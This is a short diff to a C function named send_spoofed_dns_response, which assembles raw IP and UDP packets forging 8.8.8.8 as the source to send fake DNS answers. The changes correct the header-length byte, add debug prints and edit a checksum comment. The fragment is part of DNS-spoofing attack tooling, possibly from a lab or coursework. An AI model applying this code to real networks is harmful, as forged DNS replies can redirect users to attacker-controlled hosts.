@@ -163,10 +163,11 @@ send_spoofed_dns_response(u_char	*dns_req,
 
 	// ==========
 	iph = (struct iphead *)dns_res;
-    	iph->ver_ihl = 45;
+    	iph->ver_ihl = 69;
     	iph->tos = 0;
 	ip_len = (iph->ver_ihl & 0xf)*4; 
     	iph->tlen = htons(ip_len + 8 + len + sizeof(dns_response)); 
+	printf("\nIP header length = %d\n", ip_len);
     	iph->identification = htons(1111);
     	iph->flags_fo = htons(16384);       
     	iph->ttl = 255;            
@@ -174,7 +175,8 @@ send_spoofed_dns_response(u_char	*dns_req,
     	iph->crc = 0;            
     	iph->saddr = inet_addr("8.8.8.8");      
     	iph->daddr = *dest_ip;
-	//iph->crc = csum((unsigned short *)dns_res, iph->tlen); 
+	
+	//iph->crc = csum((unsigned short *)dns_res, htons(iph->tlen)); 
 	// ==========
 	
 	memcpy(dns_res + ip_len + 8, dns_req, len);
@@ -216,6 +218,7 @@ send_spoofed_dns_response(u_char	*dns_req,
 	udp->sport = htons(53);
 	udp->dport = dest_port;
 	udp->len = htons(len + sizeof(dns_response) + 8);
+	printf("\nUDP header length = %d\n", htons(udp->len));
 	udp->crc = 0;
 
         printf("\nTotal DNS response:\n");
